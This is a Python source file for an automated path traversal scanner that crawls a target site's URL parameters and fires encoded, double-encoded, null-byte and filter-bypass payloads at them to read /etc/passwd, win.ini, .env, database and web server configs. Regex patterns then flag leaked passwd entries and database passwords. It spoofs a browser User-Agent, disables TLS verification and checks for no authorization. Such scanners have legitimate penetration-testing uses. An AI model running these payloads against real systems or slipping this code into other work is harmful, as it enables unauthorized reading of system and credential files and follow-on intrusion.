from colorama import Fore
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import requests
import re
import os
import logging
import time
from typing import List, Dict, Tuple, Set
import concurrent.futures

# Set up logging for errors only
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

requests.packages.urllib3.disable_warnings()

class PathTraversalScanner:
    """Advanced path traversal vulnerability scanner with improved detection and performance."""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Enhanced path traversal payloads
        self.traversal_payloads = [
            # Basic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            
            # Encoded traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            
            # Double encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            
            # Unicode encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            
            # Null byte injection (older systems)
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.png",
            
            # Different depth levels
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            
            # Windows targets
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\boot.ini",
            
            # Web server configs
            "../../../apache/conf/httpd.conf",
            "../../../nginx/nginx.conf",
            "../../../etc/apache2/apache2.conf",
            
            # Application configs
            "../../../config/database.yml",
            "../../../app/config/parameters.yml",
            "../../../.env",
            "../../../config.php",
            
            # System files (Linux)
            "../../../etc/hosts",
            "../../../etc/hostname",
            "../../../etc/resolv.conf",
            "../../../proc/version",
            "../../../proc/cmdline",
            
            # Log files
            "../../../var/log/apache2/access.log",
            "../../../var/log/apache2/error.log",
            "../../../var/log/nginx/access.log",
            
            # Bypass filters
            "....//....//....//etc/passwd",
            "..././..././..././etc/passwd",
            "....\\....\\....\\windows\\win.ini",
        ]
        
        # Detection patterns for successful traversal
        self.detection_patterns = [
            # Linux /etc/passwd patterns
            r"root:.*?:",
            r"daemon:.*?:",
            r"bin:.*?:",
            r"sys:.*?:",
            r"nobody:.*?:",
            r"[a-zA-Z0-9_\-]+:[x*]:[\d]+:[\d]+:",
            
            # Windows system files
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"multi\(0\)disk\(0\)rdisk\(0\)",
            r"# Copyright.*Microsoft Corp",
            r"# This file contains the mappings",
            
            # Configuration files
            r"DocumentRoot",
            r"ServerName",
            r"Listen.*:80",
            r"LoadModule",
            r"<VirtualHost",
            r"server_name",
            r"location.*{",
            
            # Database configs
            r"password.*[:=]",
            r"database.*[:=]",
            r"DB_PASSWORD",
            r"DB_HOST",
            
            # Log file patterns
            r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*GET.*HTTP/",
            r"\[\w{3}\s+\w{3}\s+\d{1,2}.*\]",
        ]
        
    def is_valid_url(self, url: str) -> bool:
        """Validate URL format."""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False
    
    def extract_parameters_from_url(self, url: str) -> Dict[str, str]:
        """
        Extract parameters from URL for testing.
        
        Args:
            url: Target URL to extract parameters from
            
        Returns:
            Dictionary of parameter names and values
        """
        parameters = {}
        
        try:
            parsed_url = urlparse(url)
            
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query, keep_blank_values=True)
                for key, values in query_params.items():
                    parameters[key] = values[0] if values else ''
        
        except Exception as e:
            logger.error(f"Error extracting parameters: {str(e)}")
        
        return parameters
    
    def extract_parameters_from_page(self, url: str) -> List[Tuple[str, str]]:
        """
        Extract parameters by crawling the page for links from the same domain only.
        
        Args:
            url: Target URL to crawl
            
        Returns:
            List of (URL, parameter) tuples for same domain only
        """
        param_links = []
        
        try:
            # Get the target domain for filtering
            target_domain = urlparse(url).netloc.lower()
            if target_domain.startswith('www.'):
                target_domain = target_domain[4:]
            
            response = self.session.get(url, timeout=10, verify=False)
            response.raise_for_status()
            
            # Find all links with parameters
            links = re.findall(r'href\s*=\s*["\']([^"\']*\?[^"\']*)["\']', response.text, re.IGNORECASE)
            
            for link in links:
                # Resolve relative URLs
                full_url = urljoin(url, link)
                
                # Check if the link belongs to the target domain
                link_domain = urlparse(full_url).netloc.lower()
                if link_domain.startswith('www.'):
                    link_domain = link_domain[4:]
                
                # Only process links from the same domain
                if link_domain == target_domain or not link_domain:  # Allow relative URLs
                    # Extract parameters
                    parsed = urlparse(full_url)
                    if parsed.query:
                        query_params = parse_qs(parsed.query, keep_blank_values=True)
                        for param_name in query_params.keys():
                            # Clean parameter name (remove HTML entities)
                            clean_param = param_name.replace('&amp;', '&')
                            param_links.append((full_url, clean_param))
        
        except Exception as e:
            logger.error(f"Error extracting parameters from page: {str(e)}")
        
        return param_links
    
    def detect_traversal_success(self, response: requests.Response, payload: str) -> bool:
        """
        Detect if path traversal was successful.
        
        Args:
            response: HTTP response object
            payload: Traversal payload used
            
        Returns:
            True if traversal detected, False otherwise
        """
        try:
            content = response.text
            
            # Check for detection patterns
            for pattern in self.detection_patterns:
                if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                    return True
            
            # Additional checks for specific payloads
            if "etc/passwd" in payload.lower():
                # Look for Unix passwd file structure
                lines = content.split('\n')
                passwd_lines = 0
                for line in lines:
                    if ':' in line and len(line.split(':')) >= 6:
                        passwd_lines += 1
                
                if passwd_lines >= 3:  # Multiple passwd-like lines
                    return True
            
            elif "win.ini" in payload.lower() or "boot.ini" in payload.lower():
                # Look for Windows system file indicators
                if any(indicator in content.lower() for indicator in ['[boot loader]', '[fonts]', '[extensions]']):
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error in traversal detection: {str(e)}")
            return False
    
    def test_parameter_for_traversal(self, base_url: str, param_name: str, original_value: str) -> List[Tuple[str, str]]:
        """
        Test a parameter for path traversal vulnerability.
        
        Args:
            base_url: Base URL for testing
            param_name: Parameter name to test
            original_value: Original parameter value
            
        Returns:
            List of successful payloads with response info
        """
        vulnerabilities = []
        
        for payload in self.traversal_payloads:
            try:
                # Parse URL and update parameter
                parsed_url = urlparse(base_url)
                query_params = parse_qs(parsed_url.query, keep_blank_values=True)
                
                # Update target parameter
                test_params = {}
                for key, values in query_params.items():
                    if key == param_name:
                        test_params[key] = payload
                    else:
                        test_params[key] = values[0] if values else ''
                
                # Construct test URL
                test_query = urlencode(test_params)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                if test_query:
                    test_url += f"?{test_query}"
                
                # Make request
                response = self.session.get(
                    test_url,
                    timeout=10,
                    verify=False,
                    allow_redirects=True
                )
                
                # Check for successful traversal
                if response.status_code == 200 and self.detect_traversal_success(response, payload):
                    vulnerabilities.append((payload, f"Status: {response.status_code}, Length: {len(response.text)}"))
                
            except requests.exceptions.RequestException as e:
                logger.error(f"Request error testing {payload}: {str(e)}")
                continue
            except Exception as e:
                logger.error(f"Error testing payload {payload}: {str(e)}")
                continue
            
            # Rate limiting
            time.sleep(0.3)
        
        return vulnerabilities
    
    def save_results(self, vulnerabilities: List[Tuple[str, str, str, str]]) -> None:
        """Save path traversal results to file."""
        if not vulnerabilities:
            return
        
        try:
            os.makedirs("output", exist_ok=True)
            
            with open("output/path_traversal.txt", "w", encoding='utf-8') as f:
                f.write("=== Path Traversal Vulnerability Report ===\n\n")
                f.write(f"Total vulnerabilities found: {len(vulnerabilities)}\n\n")
                
                for i, (url, param, payload, info) in enumerate(vulnerabilities, 1):
                    f.write(f"--- Vulnerability #{i} ---\n")
                    f.write(f"URL: {url}\n")
                    f.write(f"Parameter: {param}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write(f"Response Info: {info}\n")
                    f.write("\n" + "="*50 + "\n\n")
                    
        except Exception as e:
            logger.error(f"Error saving results: {str(e)}")

def path_traversal_scan(domain: str) -> None:
    """
    Main path traversal scanning function with improved detection and error handling.
    
    Args:
        domain: Target domain/URL to scan for path traversal vulnerabilities
    """
    if not domain or not domain.strip():
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error: Domain cannot be empty")
        return
    
    scanner = PathTraversalScanner()
    
    # Validate URL
    if not scanner.is_valid_url(domain):
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error: Invalid URL format")
        return
    
    try:
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Starting path traversal scan for: {Fore.GREEN}{domain}")
        
        all_vulnerabilities = []
        
        # Method 1: Test parameters directly from URL
        url_params = scanner.extract_parameters_from_url(domain)
        if url_params:
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Found {len(url_params)} parameter(s) in URL")
            
            for param_name, param_value in url_params.items():
                print(f"{Fore.CYAN}[*] Testing URL parameter: {param_name}")
                
                vulnerabilities = scanner.test_parameter_for_traversal(domain, param_name, param_value)
                
                for payload, info in vulnerabilities:
                    all_vulnerabilities.append((domain, param_name, payload, info))
        
        # Method 2: Crawl page for links with parameters
        print(f"{Fore.CYAN}[*] Crawling page for additional parameters...")
        param_links = scanner.extract_parameters_from_page(domain)
        
        if param_links:
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Found {len(param_links)} parameter(s) from page crawling")
            
            # Create a set to track already tested parameters to avoid duplicates
            tested_params = set(url_params.keys()) if url_params else set()
            
            # Group by unique parameter names and test each parameter only once
            unique_param_urls = {}
            for link_url, param_name in param_links:
                if param_name not in tested_params and param_name not in unique_param_urls:
                    unique_param_urls[param_name] = link_url
            
            if unique_param_urls:
                print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Testing {len(unique_param_urls)} unique parameter(s)")
                
                for param_name, link_url in unique_param_urls.items():
                    print(f"{Fore.CYAN}[*] Testing crawled parameter: {param_name}")
                    
                    vulnerabilities = scanner.test_parameter_for_traversal(link_url, param_name, "")
                    
                    for payload, info in vulnerabilities:
                        all_vulnerabilities.append((link_url, param_name, payload, info))
                    
                    # Add to tested set to avoid future duplicates
                    tested_params.add(param_name)
            else:
                print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} All crawled parameters already tested")
        
        # Report results
        if all_vulnerabilities:
            unique_vulns = len(set((v[0], v[1]) for v in all_vulnerabilities))
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Path Traversal Found: {Fore.RED}{len(all_vulnerabilities)} total, {unique_vulns} unique")
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Path Traversal Report: {Fore.GREEN}Saved to /output/path_traversal.txt")
            
            # Save results
            scanner.save_results(all_vulnerabilities)
            
            # Display summary
            for url, param, payload, info in all_vulnerabilities[:5]:  # Show first 5
                print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Vulnerable: {param} -> {Fore.YELLOW}{payload}")
            
            if len(all_vulnerabilities) > 5:
                print(f"{Fore.CYAN}[*] ... and {len(all_vulnerabilities) - 5} more (see report file)")
        else:
            print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No path traversal vulnerabilities found")
        
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Request timed out")
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Connection error - check URL and network")
    except requests.exceptions.HTTPError as e:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} HTTP error: {e.response.status_code}")
    except Exception as e:
        logger.error(f"Path traversal scan error: {str(e)}")
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error during path traversal scan: {str(e)}")
    finally:
        # Clean up session
        scanner.session.close()